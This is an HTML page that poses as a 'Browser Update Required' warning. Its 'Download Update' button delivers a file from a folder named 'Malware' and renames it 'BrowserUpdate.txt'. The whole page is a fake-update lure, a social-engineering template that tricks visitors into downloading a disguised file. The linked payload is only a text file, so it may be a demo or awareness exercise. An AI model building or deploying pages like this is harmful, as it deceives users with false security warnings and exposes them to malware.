<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser Update Required</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f9f9f9;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            text-align: center;
            padding: 30px;
            border: 1px solid #e0e0e0;
        }
        .container img {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            color: #ff4b4b;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
            color: #666;
        }
        .update-button {
            background-color: #007BFF;
            color: #fff;
            padding: 12px 20px;
            font-size: 16px;
            text-decoration: none;
            border-radius: 5px;
            display: inline-block;
            transition: background-color 0.3s, transform 0.2s;
            box-shadow: 0 4px 8px rgba(0, 123, 255, 0.2);
        }
        .update-button:hover {
            background-color: #0056b3;
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(0, 123, 255, 0.3);
        }
        .update-button:active {
            transform: scale(1.02);
        }
        footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="Images/warning.png" alt="Warning Icon">
        <h1>Browser Update Required</h1>
        <p>Your browser version is outdated and may no longer be supported. Please update your browser to the latest version to ensure compatibility and security.</p>
        <a href="Malware/malware.txt" download="BrowserUpdate.txt" class="update-button">Download Update</a>
        <footer>Â© 2024 BrowserUpdate. All rights reserved.</footer>
    </div>
</body>
</html>
